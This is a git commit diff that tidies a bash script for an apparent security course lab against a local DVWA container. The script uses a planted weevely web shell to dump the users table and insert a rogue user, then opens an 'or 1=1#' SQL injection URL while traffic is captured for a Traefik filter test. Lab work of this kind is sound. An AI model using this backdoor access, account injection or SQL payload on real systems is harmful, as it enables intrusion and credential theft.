f5851874c280c8eeb81f42313b0ebf5d3e01ac68
Artemiy Granat <artemiigranat@gmail.com>
2024-11-14 00:08:19 +0300

    refactor: prettify task2 script

--- task2/task2.sh
+++ task2/task2.sh
@@ -1,52 +1,47 @@
 #!/bin/bash
 
-dvwa_backdoor_url=http://localhost/hackable/uploads/bd.php
-dvwa_backdoor_pass=123
+sqli_url="http://localhost/vulnerabilities/sqli/?id=1%27+or+1%3D1%23&Submit=Submit"
 
 surname=granat
-password=$(echo $surname | md5)
+password=$(printf "%s" $surname | md5)
 
 execute_sql_query_weevely()
 {
-    docker exec -it kali weevely "$dvwa_backdoor_url" "$dvwa_backdoor_pass" \
-        "$1"
+    local backdoor_url=http://localhost/hackable/uploads/bd.php
+    local backdoor_pass=123
+    docker exec -it kali weevely "$backdoor_url" "$backdoor_pass" \
+        ":sql_console -user app -passwd vulnerables -database dvwa 
+            -query '$1;'"
 }
 
 # Start DVWA containers in detached mode
 docker compose up -d
 
-read -n 1 -s -p "Create the database on http://localhost/setup.php"
+read -n 1 -s -p "Create the database on http://localhost/setup.php, then \
+press any key"
 
 # Retrieve a list of all users from the DVWA database
-execute_sql_query_weevely \
-    ":sql_console -user app -passwd vulnerables -database dvwa 
-        -query 'select * from users;'"
+execute_sql_query_weevely "select * from users"
 
 # Insert a new user to the DVWA database with password 'user'
 execute_sql_query_weevely \
-    ":sql_console -user app -passwd vulnerables -database dvwa -query 
-        'insert into users values(6, \"$surname\", \"$surname\", \"$surname\", 
-        \"$password\", \"/hackable/users/admin.jpg\", 
-        NOW(), 0);'"
+    "insert into users values(6, \"$surname\", \"$surname\", \"$surname\", 
+        \"$password\", \"/hackable/users/admin.jpg\", NOW(), 0)"
 
 # Verify that the new user has been successfully inserted
-execute_sql_query_weevely \
-    ":sql_console -user app -passwd vulnerables -database dvwa 
-        -query 'select * from users;'"
+execute_sql_query_weevely "select * from users"
 
-read -n 1 -s -p "Login on http://localhost/login.php, then open Wireshark and \
-start capturing traffic on the lo interface"
+read -n 1 -s -p "Login on http://localhost/login.php, then open Wireshark, \
+start capturing traffic on the lo interface and press any key"
 
 # Submit a SQL injection through the web interface
-firefox "http://localhost/vulnerabilities/sqli/?id=1%27+or+1%3D1%23&Submit=Submit"
+firefox "$sqli_url"
 
-read -n 1 -s -p "Uncomment the last line of traefik/dynamic_conf.yml and open \
-Wireshark and start capturing traffic on the loopback interface"
+read -n 1 -s -p "Uncomment the last line of traefik/dynamic_conf.yml, open \
+Wireshark, start capturing traffic on the loopback interface and press any key"
 
 # Submit a SQL injection through the web interface again
-firefox "http://localhost/vulnerabilities/sqli/?id=1%27+or+1%3D1%23&Submit=Submit"
+firefox "$sqli_url"
 
 # Stop and remove the DVWA containers from Docker
 docker compose down
-
-
